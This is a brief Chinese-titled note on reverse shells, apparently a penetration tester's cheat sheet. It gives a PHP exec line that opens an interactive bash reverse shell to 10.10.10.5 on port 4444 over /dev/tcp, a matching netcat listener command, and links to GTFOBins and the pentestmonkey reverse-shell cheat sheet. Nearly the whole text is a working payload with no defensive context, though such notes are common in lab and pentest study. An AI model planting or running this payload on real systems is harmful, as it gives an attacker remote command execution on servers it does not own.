# 反弹 Shell 小记

```
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'"); ?>

    sudo nc -lvnp 4444
```

- https://gtfobins.github.io/

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet